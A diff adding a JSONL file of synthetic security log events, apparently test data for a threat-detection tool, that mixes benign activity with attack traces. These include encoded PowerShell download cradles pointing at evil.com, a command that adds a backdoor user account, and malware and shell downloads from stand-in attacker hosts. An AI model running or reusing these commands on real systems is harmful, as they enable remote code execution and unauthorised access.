@@ -1,0 +1,20 @@
+{"timestamp": "2025-11-06T11:00:00Z", "event_type": "process_creation", "process_name": "powershell.exe", "command_line": "powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIA==", "user": "attacker"}
+{"timestamp": "2025-11-06T11:01:00Z", "event_type": "process_creation", "process_name": "pwsh.exe", "command_line": "powershell -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==", "user": "victim"}
+{"timestamp": "2025-11-06T11:02:00Z", "event_type": "file_download", "file_path": "/tmp/malware.exe", "source_url": "http://evil.com/malware.exe", "user": "user1"}
+{"timestamp": "2025-11-06T11:03:00Z", "event_type": "file_download", "file_path": "C:\\Users\\victim\\Downloads\\trojan.dll", "source_url": "http://badsite.net/trojan.dll", "user": "user2"}
+{"timestamp": "2025-11-06T11:04:00Z", "event_type": "file_download", "file_path": "/home/user/document.pdf", "source_url": "http://legitimate.com/doc.pdf", "user": "user3"}
+{"timestamp": "2025-11-06T11:05:00Z", "event_type": "network_connection", "destination_ip": "10.0.0.50", "destination_domain": "internal-server.local", "port": 8080, "protocol": "tcp"}
+{"timestamp": "2025-11-06T11:06:00Z", "event_type": "network_connection", "destination_ip": "192.168.1.100", "destination_domain": "suspicious-host", "port": 4444, "protocol": "tcp"}
+{"timestamp": "2025-11-06T11:07:00Z", "event_type": "network_connection", "destination_ip": "203.0.113.45", "destination_domain": "test-network", "port": 443, "protocol": "https"}
+{"timestamp": "2025-11-06T11:08:00Z", "event_type": "process_creation", "process_name": "cmd.exe", "command_line": "net user hacker password123 /add", "user": "SYSTEM"}
+{"timestamp": "2025-11-06T11:09:00Z", "event_type": "process_creation", "process_name": "explorer.exe", "command_line": "explorer.exe C:\\Users", "user": "john.doe"}
+{"timestamp": "2025-11-06T11:10:00Z", "event_type": "process_creation", "process_name": "powershell.exe", "command_line": "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==", "user": "victim2"}
+{"timestamp": "2025-11-06T11:11:00Z", "event_type": "file_download", "file_path": "/opt/scripts/payload.ps1", "source_url": "http://attacker.com/payload.ps1", "user": "www-data"}
+{"timestamp": "2025-11-06T11:12:00Z", "event_type": "network_connection", "destination_ip": "8.8.8.8", "destination_domain": "dns.google", "port": 53, "protocol": "udp"}
+{"timestamp": "2025-11-06T11:13:00Z", "event_type": "network_connection", "destination_ip": "192.168.1.101", "destination_domain": "local-printer", "port": 9100, "protocol": "tcp"}
+{"timestamp": "2025-11-06T11:14:00Z", "event_type": "network_connection", "destination_ip": "172.16.0.50", "destination_domain": "app-server", "port": 55000, "protocol": "tcp"}
+{"timestamp": "2025-11-06T11:15:00Z", "event_type": "file_download", "file_path": "C:\\Temp\\backdoor.bat", "source_url": "http://malicious.org/backdoor.bat", "user": "admin"}
+{"timestamp": "2025-11-06T11:16:00Z", "event_type": "process_creation", "process_name": "powershell.exe", "command_line": "powershell.exe -w hidden -nop -enc VwByAGkAdABlAC0ASABvAHMAdAAgACIATQBhAGwAaQBjAGkAbwB1AHMAIABTAGMACQB0ACIA", "user": "compromised"}
+{"timestamp": "2025-11-06T11:17:00Z", "event_type": "network_connection", "destination_ip": "10.0.0.75", "destination_domain": "db-server", "port": 3306, "protocol": "tcp"}
+{"timestamp": "2025-11-06T11:18:00Z", "event_type": "file_download", "file_path": "/var/www/shell.hta", "source_url": "http://c2server.net/shell.hta", "user": "apache"}
+{"timestamp": "2025-11-06T11:19:00Z", "event_type": "network_connection", "destination_ip": "203.0.113.100", "destination_domain": "test-endpoint", "port": 65535, "protocol": "tcp"}
